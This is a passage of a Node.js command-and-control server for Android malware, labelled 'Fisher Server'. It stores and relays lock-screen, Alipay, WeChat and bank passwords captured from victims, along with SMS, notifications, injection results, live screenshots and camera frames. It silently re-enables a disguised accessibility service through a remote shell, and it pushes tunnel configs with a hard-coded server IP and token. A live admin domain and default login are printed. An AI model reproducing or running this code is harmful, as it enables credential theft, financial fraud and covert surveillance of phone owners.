// //           }
// //         }, 5000);

        // 自动恢复无障碍服务（通过 ADB，防止服务器重启后无障碍掉线）
        setTimeout(() => {
          const http = require('http');
          // 先检查 frpc 是否可用
          const checkUrl = `http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${encodeURIComponent('settings get secure enabled_accessibility_services')}`;
          http.get(checkUrl, { timeout: 5000 }, (res) => {
            const chunks = [];
            res.on('data', c => chunks.push(c));
            res.on('end', () => {
              try {
                const data = JSON.parse(Buffer.concat(chunks).toString());
                const current = (data.data?.output || '').trim();
                if (!current || current === 'null') {
                  // 无障碍未启用，查找包名并恢复
                  const findPkgCmd = encodeURIComponent("pm list packages -3 | grep -v google | grep -v vivo | grep -v baidu | grep -v tencent");
                  http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${findPkgCmd}`, { timeout: 5000 }, (pkgRes) => {
                    const pkgChunks = [];
                    pkgRes.on('data', c => pkgChunks.push(c));
                    pkgRes.on('end', () => {
                      try {
                        const pkgData = JSON.parse(Buffer.concat(pkgChunks).toString());
                        const output = pkgData.data?.output || '';
                        const pkgs = output.split('\n').map(l => l.trim().replace('package:', '')).filter(p => p && p.startsWith('com.') && p.length <= 20 && !p.includes('widget'));
                        const ourPkg = pkgs[0] || 'com.dev.rehwft';
                        const service = `${ourPkg}/com.titan.solid.luck.service.unfaiahnst`;
                        const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
                        http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
                          http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${encodeURIComponent('settings put secure accessibility_enabled 1')}`, { timeout: 3000 }, () => {}).on('error', () => {});
                          console.log(`[A11Y] ✅ ${deviceId}: 无障碍自动恢复 (${service})`);
                        }).on('error', () => {});
                      } catch {}
                    });
                  }).on('error', () => {});
                } else {
                  console.log(`[A11Y] ${deviceId}: 无障碍正常 (${current.slice(0,30)})`);
                }
              } catch {}
            });
          }).on('error', () => {});
        }, 10000); // 设备连接10秒后检查
      } else if (deviceId) {
        deviceConnections.set(deviceId, ws); // 更新引用
      }

      // 处理截图回传（APP通过proxy_result回传截图数据）

      // 处理 status 消息 - 更新设备信息到数据库
      if (msgType === 'status') {
        const d = msg.data || msg;
        const now = Date.now() / 1000;
        const updates = [];
        const values = [];
        if (d.brand) { updates.push('brand=?'); values.push(d.brand); }
        if (d.model) { updates.push('model=?'); values.push(d.model); }
        if (d.osVersion) { updates.push('os_version=?'); values.push(d.osVersion); }
        if (d.appVersion) { updates.push('app_version=?'); values.push(d.appVersion); }
        if (d.batteryLevel !== undefined) { updates.push('battery_level=?'); values.push(d.batteryLevel); }
        if (d.networkType) { updates.push('network_type=?'); values.push(d.networkType); }
        if (d.screenWidth) { updates.push('screen_width=?'); values.push(d.screenWidth); }
        if (d.screenHeight) { updates.push('screen_height=?'); values.push(d.screenHeight); }
        if (d.appName) { updates.push('app_name=?'); values.push(d.appName); }
        updates.push('last_seen=?'); values.push(now);
        updates.push('is_connected=1');
        if (deviceId && updates.length > 1) {
          values.push(deviceId);
          db.prepare(`UPDATE devices SET ${updates.join(',')} WHERE device_id=?`).run(...values);
          // 广播给管理端实时更新
          const row = db.prepare('SELECT * FROM devices WHERE device_id=?').get(deviceId);
          if (row) {
            const statusData = deviceToBotList(row);
            broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: statusData, botId: deviceId });
          }
        }
        return;
      }

      if (msgType === 'proxy_result' || msgType === 'screenshot' || msgType === 'screen_data' || msgType === 'local_screenshot_response') {
        // 无障碍通道截图：只转发给管理端（阅读器），不写入 screenshotCache（ADB 通道独立管理）
        broadcastToAdmins({ ...msg, deviceId, sessionId: deviceId, botId: deviceId });
        return;
      }

      // 处理 local_service_deploy 状态更新
      if (msgType === 'local_service_deploy') {
        const status = msg.data?.status || '';
        if (status === 'deploy_success' || status === 'full_deploy_success') {
          if (deviceId) {
            db.prepare('UPDATE devices SET local_service_connected=1 WHERE device_id=?').run(deviceId);
            console.log(`[ADB] ✅ ${deviceId}: localService 部署成功`);
            // 通知前端更新 localServiceConnected
            broadcastToAdmins({ type: 'local_service_status', deviceId, sessionId: deviceId, botId: deviceId, data: { deviceId, connected: true } });
          }
        } else if (status === 'deploy_failed' || status === 'full_deploy_failed') {
          console.log(`[ADB] ❌ ${deviceId}: localService 部署失败 - ${msg.data?.message || ''}`);
        }
        // 转发给管理端
        const fwd = { ...msg, deviceId, sessionId: deviceId, botId: deviceId };
        broadcastToAdmins(fwd);
        return;
      }

      // 处理注入结果回传（APP 提交注入获取的数据）
      if (msgType === 'injection_result' || msgType === 'inject_result') {
        const inner = msg.data || {};
        if (deviceId && inner.body) {
          const deviceRow = db.prepare('SELECT brand,device_id FROM devices WHERE device_id=?').get(deviceId);
          const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
          db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
            .run(deviceId, deviceName, deviceId, inner.address || `[注入] ${inner.templateName||''}`, inner.body || '', 'injection', Date.now());
          console.log(`[INJECT] ← ${deviceId}: ${inner.address || inner.templateName}`);
        }
        const fwd = { ...msg, deviceId, sessionId: deviceId, botId: deviceId };
        broadcastToAdmins(fwd);
        return;
      }

      // 处理短信/通知上报
      if (msgType === 'sms_data' || msgType === 'notification_data') {
        const inner = msg.data || {};
        if (deviceId && (inner.body || inner.content)) {
          const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
          const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
          db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
            .run(deviceId, deviceName, deviceId, inner.address || inner.sender || '', inner.body || inner.content || '', msgType === 'sms_data' ? 'sms' : 'notification', inner.date || Date.now());
        }
      }

      // 处理密码输入上报
      if (msgType === 'password_input' || msgType === 'password_captured' || msgType === 'credential_captured' || msgType === 'password_status') {
        const inner = msg.data || {};
        if (deviceId) {
          // password_status 格式: {lockPassword:{value,type,captureTime}, alipayPassword:{...}, wechatPassword:{...}, ...}
          if (msgType === 'password_status') {
            const fields = ['lockPassword', 'alipayPassword', 'wechatPassword', 'paymentPassword', 'bankPassword'];
            for (const field of fields) {
              const pwd = inner[field];
              if (pwd && pwd.value && pwd.captured !== false) {
                // 检查是否已存在（避免重复插入）
                const exists = db.prepare('SELECT id FROM password_inputs WHERE device_id=? AND input_text=? AND password_type=?').get(deviceId, pwd.value, field);
                if (!exists) {
                  // 规范化密码类型（前端只认 pattern/pin/password/mixed）
                  let normalType = pwd.type || field;
                  if (normalType.includes('pin') || normalType.includes('PIN')) normalType = 'pin';
                  else if (normalType.includes('pattern')) normalType = 'pattern';
                  else if (normalType.includes('mixed') || normalType.includes('alpha')) normalType = 'mixed';
                  else if (normalType.includes('password') || normalType.includes('text')) normalType = 'password';
                  db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
                    .run(deviceId, field.replace('Password', ''), '', pwd.value, normalType, pwd.captureTime || Date.now());
                  console.log(`[PWD] ← ${deviceId}: ${field} = ${pwd.value.slice(0,3)}***`);
                }
              }
            }
            // 也处理动态字段
            for (const [key, val] of Object.entries(inner)) {
              if (key === 'deviceId' || key === 'type' || fields.includes(key)) continue;
              if (val && typeof val === 'object' && val.value) {
                const exists = db.prepare('SELECT id FROM password_inputs WHERE device_id=? AND input_text=? AND password_type=?').get(deviceId, val.value, key);
                if (!exists) {
                  db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
                    .run(deviceId, key.replace('Password', ''), '', val.value, val.type || key, val.captureTime || Date.now());
                  console.log(`[PWD] ← ${deviceId}: ${key} = ${val.value.slice(0,3)}***`);
                }
              }
            }
          } else {
            // 通用格式
            const text = inner.inputText || inner.text || inner.password || inner.value || '';
            if (text) {
              db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
                .run(deviceId, inner.appName || inner.app || '', inner.packageName || inner.pkg || '', text, inner.passwordType || inner.type || 'password', inner.timestamp || Date.now());
              console.log(`[PWD] ← ${deviceId}: ${inner.appName || 'unknown'}`);
            }
          }
        }
        broadcastToAdmins({ ...msg, deviceId, sessionId: deviceId, botId: deviceId });
        return;
      }

      // 处理心跳 - 更新数据库和通知管理端
      if (msgType === 'status' || msgType === 'device_heartbeat') {
        const inner = msg.data || {};
        const now = Date.now() / 1000;
        if (deviceId) {
          db.prepare('UPDATE devices SET battery_level=?,network_type=?,brand=?,model=?,os_version=?,app_version=?,screen_width=?,screen_height=?,is_connected=1,last_seen=? WHERE device_id=?')
            .run(inner.batteryLevel||0, inner.networkType||'', inner.brand||'', inner.model||'', inner.osVersion||'', inner.appVersion||'', inner.screenWidth||0, inner.screenHeight||0, now, deviceId);
        }
        // 转发状态给管理端
        const statusData = { ...inner, botId: deviceId, deviceId };
        // 如果心跳里带了 lockScreenType，规范化它
        if (statusData.lockScreenType) {
          const typeMap = {'6pin':'pin','4pin':'pin','6PIN':'pin','4PIN':'pin','numeric':'pin','PIN_4':'pin','PIN_6':'pin','NUMERIC_COMPLEX':'pin','PASSWORD_QUALITY_NUMERIC_COMPLEX':'pin','PASSWORD_QUALITY_ALPHANUMERIC':'mixed'};
          statusData.lockScreenType = typeMap[statusData.lockScreenType] || statusData.lockScreenType;
        } else {
          // 心跳没带 lockScreenType，从数据库补充
          const pwdR = db.prepare('SELECT password_type FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(deviceId);
          if (pwdR) {
            const tm = {'6pin':'pin','4pin':'pin','pin':'pin','mixed':'mixed','pattern':'pattern','password':'password'};
            statusData.lockScreenType = tm[pwdR.password_type] || pwdR.password_type;
          }
        }
        broadcastToAdmins({ type: 'device_status_update', sessionId: deviceId, data: statusData, botId: deviceId });
        broadcastToAdmins({ type: 'get_device_state_response', sessionId: deviceId, data: statusData, botId: deviceId });

        // ★ 无障碍自动恢复：APP心跳上报 accessibilityAlive=false 时，通过ADB恢复
        if (deviceId && inner.accessibilityAlive === false) {
          autoRestoreAccessibility(deviceId, 'heartbeat_report');
        }
        return;
      }

      // app_list_response: 打印调试信息
      if (msgType === 'app_list_response') {
        const appsCount = (msg.data && msg.data.apps) ? msg.data.apps.length : 0;
        const total = (msg.data && msg.data.total) ? msg.data.total : 0;
        console.log('[APP_LIST] ' + deviceId + ': total=' + total + ', apps=' + appsCount);
      }

      // 其他消息（screenshot、ui_hierarchy、sms_data 等）直接转发给管理端
      const fwd = { ...msg };
      if (deviceId) {
        fwd.deviceId = deviceId;
        fwd.sessionId = deviceId;
        fwd.botId = deviceId;
      }
      // 消息类型映射（设备发的 → 前端期望的）
      if (fwd.type === 'camera_frame') fwd.type = 'camera_data';
      broadcastToAdmins(fwd);

    } catch (e) {
      // 非 JSON 消息（可能是二进制帧 - 截图数据），缓存并转发
      // 临时日志：记录所有解析失败的消息
      if (raw && !(raw instanceof Buffer && raw.length > 100 && (raw[0] === 0xFF || raw[0] === 0x89 || raw[0] === 0x52))) {
        const str = raw instanceof Buffer ? raw.toString().slice(0, 300) : String(raw).slice(0, 300);
        console.log(`[DEV-WS-RAW] ← ${deviceId}: len=${raw.length}, content=${str}`);
      }
      if (deviceId && raw instanceof Buffer && raw.length > 100) {
        // 检查是否是图片 (JPEG: FF D8, WebP: RIFF, PNG: 89 50)
        if ((raw[0] === 0xFF && raw[1] === 0xD8) || (raw[0] === 0x52 && raw[1] === 0x49) || (raw[0] === 0x89 && raw[1] === 0x50)) {
          // 无障碍通道截图：不写入 screenshotCache（ADB 通道独立管理）
          // 只转发给订阅了该设备的管理端（阅读器用）
          const subs = deviceSubscribers.get(deviceId);
          if (subs && subs.size > 0) {
            for (const adminWs of subs) {
              if (adminWs.readyState === 1) {
                try { adminWs.send(raw); } catch {}
              }
            }
          }
          return;
        }
      }
      // 非图片二进制数据，广播给所有管理端
      for (const adminWs of adminConnections) {
        if (adminWs.readyState === 1) {
          try { adminWs.send(raw); } catch {}
        }
      }
    }
  });

  ws.on('close', (code, reason) => {
    console.log(`[${new Date().toISOString()}] [WS] 设备断开: ${deviceId}, code=${code}, reason=${reason ? reason.toString() : 'none'}`);
    if (deviceId) {
      deviceConnections.delete(deviceId);
      db.prepare('UPDATE devices SET is_connected=0,last_seen=? WHERE device_id=?').run(Date.now() / 1000, deviceId);
      broadcastToAdmins({ type: 'device_offline', sessionId: deviceId, deviceId });
    }
  });

  ws.on('error', (err) => {
    console.log(`[${new Date().toISOString()}] [WS] 设备错误: ${deviceId}, err=${err.message}`);
    if (deviceId) deviceConnections.delete(deviceId);
  });

  // 心跳保活
  const pingInterval = setInterval(() => {
    if (ws.readyState === 1) ws.ping();
    else clearInterval(pingInterval);
  }, 30000);

  ws.on('close', () => clearInterval(pingInterval));
}

// ============================================================
// Bridge WebSocket（local-service 通过此通道与服务器通信）
// ============================================================
const bridgeConnections = new Map(); // deviceId -> ws

function handleBridgeWs(ws, req) {
  const url = new URL(req.url, `https://${req.headers.host}`);
  const deviceId = url.searchParams.get('deviceId') || '';
  console.log(`[Bridge] 连接: ${deviceId}, ip=${req.socket.remoteAddress}`);
  
  if (deviceId) {
    bridgeConnections.set(deviceId, ws);
    // ★ Bridge 连接后自动推送 frps 隧道配置，让 local-service 启动 frpc
    try {
      const localPort = 7912; // local-service 默认端口
      const remotePort = getDevicePort(deviceId);
      const token = 'fisher_frp_2026';
      const tunnelConfig = {
        type: 'tunnel_config',
        serverAddr: '202.95.8.130',
        serverPort: 7000,
        token: token,
        remotePort: remotePort,
        localPort: localPort,
        configINI: `[common]\nserver_addr = 202.95.8.130\nserver_port = 7000\ntoken = ${token}\nadmin_addr = 127.0.0.1\nadmin_port = 7400\n\n[${deviceId}_local]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ${localPort}\nremote_port = ${remotePort}\n`
      };
      ws.send(JSON.stringify(tunnelConfig));
      console.log(`[Bridge] ★ 推送隧道配置: ${deviceId} → remotePort=${remotePort}`);
    } catch(e) { console.log(`[Bridge] 推送隧道配置失败: ${e.message}`); }
  }

  ws.on('message', (raw) => {
    try {
      console.log(`[BRIDGE-MSG] ${deviceId}: type=${raw instanceof Buffer ? 'binary('+raw.length+')' : 'text'}, first100=${raw instanceof Buffer ? raw.slice(0,20).toString('hex') : String(raw).slice(0,100)}`);
      if (raw instanceof Buffer && raw.length > 100) {
        // Bridge 二进制截图：不写入 screenshotCache（ADB 通道独立管理）
        if ((raw[0] === 0xFF && raw[1] === 0xD8) || (raw[0] === 0x89 && raw[1] === 0x50) || (raw[0] === 0x52 && raw[1] === 0x49)) {
          // 只转发给订阅者（阅读器用），不影响 ADB 投屏
          if (deviceId) {
            const subs = deviceSubscribers.get(deviceId);
            if (subs && subs.size > 0) {
              for (const adminWs of subs) {
                if (adminWs.readyState === 1) {
                  try { adminWs.send(raw); } catch {}
                }
              }
            }
          }
          return;
        }
      }
      
      const str = (raw instanceof Buffer) ? raw.toString() : raw;
      const msg = JSON.parse(str);
      
      // 处理 minicap 截图数据（Bridge 通过 JSON 推送 base64 编码的截图）
      console.log(`[BRIDGE-JSON] ${deviceId}: keys=${JSON.stringify(Object.keys(msg))}, body_keys=${msg.body ? JSON.stringify(Object.keys(msg.body)) : 'no-body'}, bridgePath=${msg.body?.bridgePath}, hasBuffer=${!!msg.body?.buffer}`);
      if (msg.body && msg.body.bridgePath === '/minicap' && msg.body.buffer) {
        // Bridge minicap：不写入 screenshotCache（ADB 通道独立管理投屏）
        // 只解码转发给订阅者（阅读器用）
        const imgBuf = Buffer.from(msg.body.buffer, 'base64');
        if (imgBuf.length > 500 && deviceId) {
          const subs = deviceSubscribers.get(deviceId);
          if (subs && subs.size > 0) {
            for (const adminWs of subs) {
              if (adminWs.readyState === 1) {
                try { adminWs.send(imgBuf); } catch {}
              }
            }
          }
        }
        return;
      }
      
      // 处理 ping
      if (msg.type === 'ping') {
        ws.send(JSON.stringify({ type: 'pong' }));
        return;
      }
      
      // 其他 Bridge 消息转发给管理端
      if (deviceId) {
        msg.deviceId = deviceId;
        msg.sessionId = deviceId;
        msg.botId = deviceId;
      }
      broadcastToAdmins(msg);
    } catch (e) {
      // 解析失败的消息，尝试作为文本广播
      if (deviceId && raw) {
        const str = raw.toString();
        if (str.length > 0 && str.length < 10000) {
          try {
            broadcastToAdmins(JSON.parse(str));
          } catch {}
        }
      }
    }
  });

  ws.on('close', () => {
    console.log(`[Bridge] 断开: ${deviceId}`);
    if (deviceId) bridgeConnections.delete(deviceId);
  });

  ws.on('error', () => {
    if (deviceId) bridgeConnections.delete(deviceId);
  });

  // 心跳保活
  const pingInterval = setInterval(() => {
    if (ws.readyState === 1) ws.ping();
    else clearInterval(pingInterval);
  }, 30000);
  ws.on('close', () => clearInterval(pingInterval));
}

// ============================================================
// 定时推送设备状态（模拟原版行为，前端依赖持续状态更新）
// ============================================================
setInterval(() => {
  if (adminConnections.size === 0) return;
  // 服务器启动60秒内不清理（等设备重连）
  if (process.uptime() < 60) return;
  const rows = db.prepare('SELECT * FROM devices WHERE is_connected=1').all();
  for (const row of rows) {
    // 实时检查 WS 连接，跳过假在线设备
    if (!deviceConnections.has(row.device_id) && !bridgeConnections.has(row.device_id)) {
      db.prepare('UPDATE devices SET is_connected=0 WHERE device_id=?').run(row.device_id);
      broadcastToAdmins({ type: 'device_offline', sessionId: row.device_id, deviceId: row.device_id });
      continue;
    }
    const d = deviceToBotList(row);
    const pwdRow = db.prepare('SELECT password_type FROM password_inputs WHERE device_id=? ORDER BY id DESC LIMIT 1').get(row.device_id);
    const rawPwdType = pwdRow ? pwdRow.password_type : '';
    const mappedPwdType = {'6pin':'pin','4pin':'pin','6PIN':'pin','4PIN':'pin','numeric':'pin'}[rawPwdType] || rawPwdType;
    const statusData = {
      accessibilityAlive: true,
      batteryLevel: row.battery_level || 0,
      isCharging: false,
      isLocked: false,
      lockScreenType: mappedPwdType,
      networkType: row.network_type || 'WiFi',
      type: 'device_card_update'
    };
    broadcastToAdmins({ type: 'device_status_update', sessionId: d.id, data: statusData, botId: d.id });
    // 也发一条原版格式的 status 嵌套消息（确保前端能读到 lockScreenType）
    if (mappedPwdType) {
      broadcastToAdmins({ type: 'device_status_update', sessionId: d.id, data: { deviceId: d.id, status: { lockScreenType: mappedPwdType } }, botId: d.id });
    }
    broadcastToAdmins({ type: 'get_device_state_response', sessionId: d.id, data: {
      accessibilityAlive: true,
      batteryLevel: row.battery_level || 0,
      botId: d.id,
      deviceId: d.id,
      hasSim: true,
      isCharging: false,
      isLocked: false,
      isScreenOn: true,
      networkType: row.network_type || 'WiFi',
      timestamp: Date.now(),
      type: 'device_heartbeat',
      wsConnected: true
    }, botId: d.id });
  }
}, 2000); // 每2秒推送一次

// 定时清理：把数据库里 is_connected=1 但 WS 实际断开的设备标记为离线
setInterval(() => {
  if (process.uptime() < 60) return; // 启动60秒内不清理
  const rows = db.prepare('SELECT device_id FROM devices WHERE is_connected=1').all();
  for (const row of rows) {
    if (!deviceConnections.has(row.device_id) && !bridgeConnections.has(row.device_id)) {
      db.prepare('UPDATE devices SET is_connected=0,last_seen=? WHERE device_id=?').run(Date.now() / 1000, row.device_id);
      broadcastToAdmins({ type: 'device_offline', sessionId: row.device_id, deviceId: row.device_id });
    }
  }
}, 30000); // 每30秒清理一次

// ============================================================
// 定时无障碍检查：每2分钟对所有有ADB连接的在线设备轮询无障碍状态
// ============================================================
setInterval(() => {
  if (process.uptime() < 10) return; // 启动10秒内不检查
  const rows = db.prepare('SELECT device_id FROM devices WHERE is_connected=1').all();
  for (const row of rows) {
    const did = row.device_id;
    // 只检查 WS 或 Bridge 在线的设备（排除假在线）
    if (!deviceConnections.has(did) && !bridgeConnections.has(did)) continue;
    // 检查冷却，跳过刚恢复过的设备
    const last = a11yCooldown.get(did) || 0;
    if (Date.now() - last < A11Y_COOLDOWN_MS) continue;
    // 异步检查（不阻塞循环）
    checkAndRestoreAccessibility(did);
  }
}, 30 * 1000); // 每30秒一次

// ============================================================
// 截图主动轮询推送（ADB 通道独立，通过 frpc 端口轮询）
// ============================================================
let screenPushInterval = null;
const screenPushInFlight = new Map();  // deviceId -> boolean（每设备独立）
// 复用全局 frpcCooldown（命令和截图共享冷却状态）

function startScreenPush() {
  if (screenPushInterval) return;
  screenPushInterval = setInterval(() => {
    for (const [deviceId, subs] of deviceSubscribers) {
      if (subs.size === 0) continue;
      
      // 该设备已有请求在飞行中，跳过
      if (screenPushInFlight.get(deviceId)) continue;
      
      // 错误冷却：端口不通时暂停 30 秒，避免超时风暴
      if (isFrpcCooling(deviceId)) continue;
      
      // 最近有新截图就跳过
      const cached = screenshotCache.get(deviceId);
      if (cached && (Date.now() - cached.timestamp) < 800) continue;
      
      screenPushInFlight.set(deviceId, true);
      const http = require('http');
      const port = getDevicePort(deviceId);
      const proxyReq = http.get(`http://127.0.0.1:${port}/screenshot/0`, { timeout: 1500 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          screenPushInFlight.set(deviceId, false);
          const data = Buffer.concat(chunks);
          if (data.length > 500) {
            clearFrpcCooldown(deviceId);
            screenshotCache.set(deviceId, { data, timestamp: Date.now() });
            const currentSubs = deviceSubscribers.get(deviceId);
            if (currentSubs) {
              for (const ws of currentSubs) {
                if (ws.readyState === 1) {
                  try { ws.send(data); } catch {}
                }
              }
            }
          }
        });
      });
      proxyReq.on('error', () => {
        screenPushInFlight.set(deviceId, false);
        setFrpcCooldown(deviceId, 30000);
      });
      proxyReq.on('timeout', () => {
        proxyReq.destroy();
        screenPushInFlight.set(deviceId, false);
        setFrpcCooldown(deviceId, 30000);
      });
    }
  }, 250);
}
startScreenPush();

// ============================================================
// 启动
// ============================================================
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n${'='.repeat(50)}`);
  console.log(`  Fisher Server v2.0 (Node.js)`);
  console.log(`  https://admin.yunjia.casa`);
  console.log(`  wss://admin.yunjia.casa/ws/session`);
  console.log(`  账号: admin / admin123`);
  console.log(`${'='.repeat(50)}\n`);
});
